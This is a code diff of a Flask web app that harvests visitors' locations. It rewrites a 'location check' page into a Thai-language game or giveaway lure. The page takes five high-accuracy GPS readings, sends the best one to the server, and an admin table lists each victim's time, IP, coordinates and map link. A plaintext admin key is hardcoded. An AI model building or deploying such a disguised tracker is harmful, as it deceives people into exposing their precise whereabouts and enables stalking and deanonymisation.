@@ -3,7 +3,6 @@ import os
 from datetime import datetime
 
 app = Flask(__name__)
-
 ADMIN_KEY = "0949205717As"
 
 @app.route("/")
@@ -13,7 +12,8 @@ def home():
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Pro Location</title>
+<title>Location Check</title>
+
 <style>
 body {
     margin:0;
@@ -21,13 +21,13 @@ body {
     background: linear-gradient(180deg,#0f0f1f,#000);
     color:white;
     text-align:center;
-    padding-top:80px;
+    padding-top:100px;
 }
 .box {
     background: rgba(0,0,0,0.6);
     padding:40px;
     border-radius:20px;
-    width:340px;
+    width:350px;
     margin:auto;
     box-shadow:0 0 25px #6c5ce7;
 }
@@ -42,24 +42,26 @@ button {
 }
 button:hover {background:#a29bfe;}
 </style>
+
 </head>
 <body>
 
 <div class="box">
-<h2>📍 ตรวจสอบตำแหน่ง</h2>
-<p>เพื่อแสดงตำแหน่งบนแผนที่</p>
+<h2>📍 เริ่มเกม</h2>
+<p>อยากแจกของงงงง</p>
 <button onclick="start()">เริ่ม</button>
 <p id="status"></p>
 </div>
 
 <script>
 let best = null;
+let count = 0;
 
 function start(){
-    document.getElementById("status").innerText = "กำลังค้นหาตำแหน่ง...";
+    document.getElementById("status").innerText = "กำลังค้นหา...";
     
     if(navigator.geolocation){
-        for(let i=0;i<3;i++){
+        for(let i=0;i<5;i++){
             navigator.geolocation.getCurrentPosition(success, error, {
                 enableHighAccuracy:true,
                 timeout:10000,
@@ -70,6 +72,7 @@ function start(){
 }
 
 function success(pos){
+    count++;
     let acc = pos.coords.accuracy;
 
     if(!best || acc < best.acc){
@@ -81,17 +84,16 @@ function success(pos){
     }
 
     document.getElementById("status").innerText =
-        "Accuracy: " + Math.round(acc) + " m";
+        "กำลังวิเคราะห์... ("+count+"/5) | Accuracy: "+Math.round(acc)+"m";
 
-    // ถ้าแม่นพอ (<50m) ส่งเลย
-    if(acc < 50){
+    if(count >= 5){
         send(best);
     }
 }
 
 function error(){
     document.getElementById("status").innerText =
-        "กรุณาเปิด Location / GPS";
+        "กรุณาเปิด Location เพื่อความแม่นยำ";
 }
 
 function send(data){
@@ -141,7 +143,7 @@ def admin():
 
     return f"""
     <body style="background:#111;color:white">
-    <h1>📊 PRO ADMIN</h1>
+    <h1>📊 ADMIN</h1>
     <table border=1 width=100%>
     <tr><th>Time</th><th>IP</th><th>Location</th><th>Accuracy</th><th>Map</th></tr>
     {rows}
